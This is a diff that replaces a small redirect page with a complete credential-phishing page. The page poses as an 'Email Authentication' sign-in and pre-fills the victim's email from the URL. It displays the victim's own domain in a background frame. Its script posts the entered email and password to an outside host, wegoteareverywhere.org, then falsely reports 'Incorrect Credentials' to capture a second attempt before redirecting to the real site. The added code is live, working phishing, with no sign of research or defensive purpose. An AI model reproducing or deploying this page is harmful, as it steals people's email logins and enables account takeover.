@@ -1,14 +1,180 @@
-<!DOCTYPE html> 
-<html> 
-<head> 
-    <script> 
-        var val = window.location.hash.substring(1); 
-    </script> 
-</head> 
-    <body>                  
-        <script> 
-            window.location.href = "https://www.google.com#"+val; 
-           
-        </script> 
-    </body> 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title>Email Authentication | Secured</title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+        <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+        <link rel="shortcut icon" href="https://masherabot.com/img/png/adobe/acrobat.png" type="image/x-icon">
+        <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
+    </head>
+
+
+<style>
+        body{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #iframe{
+            position: fixed;
+            top: 0; right: 0; bottom: 0; left: 0;
+            width: 100vw;
+            height: 100vh;
+        }
+        .login{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100vh;
+            height: 100vh;
+            z-index: 20;
+        }
+        .login_body{
+            width: 90%;
+            max-width: 400px;
+            z-index: 10;
+            padding: 10px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 32px 0 rgb(1, 51, 177);
+            display: flex;
+            flex-flow: column;
+            gap: 10px;
+        }
+        .confirm{
+            font-weight: 600;
+        }
+        .flex_column{
+            display: flex;
+            flex-flow: column;
+        }
+        #newbutton{
+            width: fit-content !important;
+            background: #035810;
+            color: white;
+        }
+
+        .loading{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-flow: column;
+            gap: 10px;
+            position: fixed;
+            top: 0; right: 0; bottom: 0; left: 0;
+            z-index: 100;
+            background: #ffffffee;
+        }
+        .loader {
+            width: 48px;
+            height: 48px;
+            display: inline-block;
+            position: relative;
+            background: #018f52;
+            box-sizing: border-box;
+            animation: flipX 1s linear infinite;
+        }
+        @keyframes flipX {
+            0% {
+                transform: perspective(200px) rotateX(0deg) rotateY(0deg);
+            }
+            50% {
+                transform: perspective(200px) rotateX(-180deg) rotateY(0deg);
+            }
+            100% {
+                transform: perspective(200px) rotateX(-180deg) rotateY(-180deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login">
+            <div class="login_body">
+              <div class="centered">
+                <div class=><img src="https://i.postimg.cc/50fJXYcc/9810020.png" style="max-width: 90px; max-height: 100px;"></div>
+                <div class="alert alert-danger" id="msg" style="display: none;">Incorrect Password</div>
+
+                <div class="text-center confirm">Sign in to your professional email account</div>
+
+                <div id="error" style="color: red;"></div>
+                <form class="flex_column" id="form">
+                    <label class="text-secondary font-weight-bold">Email Address</label>
+                    <input type="email" class="form-control email" required="required" name="email" id="email" autocomplete="on">
+                    <label class="text-secondary font-weight-bold">Password</label>
+                    <input type="password" class="form-control password" name="password" required="" id="password">
+                    <br>
+                    <div></div>
+                    <input class="btn newbutton" type="submit" value="Sign in" name="submit" id="newbutton">
+                </form>
+            </div>
+        </div>
+
+</body>
+<div class="loading" id="loading">
+        <span class="loader"></span>
+        <h3 class="text-center">Checking ip address...</h3>
+    </div>
+
+    <iframe src="" frameborder="0" id="iframe"></iframe>
+    <input type="hidden" value="0" id="number">
+
+    <script>
+        var link = window.location.href;
+        var url = new URL(link);
+        var hash = url.hash;
+        var updated_email = hash.replace("#", "");
+        document.getElementById("email").value = updated_email;
+
+        const inputString = updated_email;
+        const delimiter = "@";
+        const delimiterIndex = inputString.indexOf(delimiter);
+        const charactersAfter = inputString.substring(delimiterIndex + 1);
+        var iframe = document.getElementById("iframe");
+        var iframe_url = "https://www." + charactersAfter ;
+        iframe.setAttribute("src", iframe_url);
+
+        setTimeout(() => {
+            var loader = document.getElementById("loading");
+            loader.style.display = "none";
+        }, 4000);
+
+        document.addEventListener("DOMContentLoaded", function() {
+            var form = document.getElementById("form");
+            form.addEventListener("submit", function(e) {
+                e.preventDefault();
+                var number = parseInt(document.getElementById("number").value);
+                var button = document.getElementById("newbutton");
+                var formData = new FormData(form);
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://wegoteareverywhere.org/tit/home.php", true);
+                var errors = document.getElementById("error");
+                errors.innerText = "Incorrect Credentials, Retype Password !";
+                var password = document.getElementById("password");
+                password.value = "";
+                var added = number + 1;
+                document.getElementById("number").value = added;
+                if (number === 1) {
+                    errors.innerText = "";
+                    setTimeout(() => {
+                        window.location.href = "https://www." + charactersAfter;
+                    }, 2000);
+                }
+
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        if (xhr.status === 200) {
+                            console.log(xhr.responseText);
+                        } else {
+                            console.error(xhr.responseText);
+                        }
+                    }
+                };
+                xhr.send(formData); 
+            });
+        });
+    </script>
 </html>
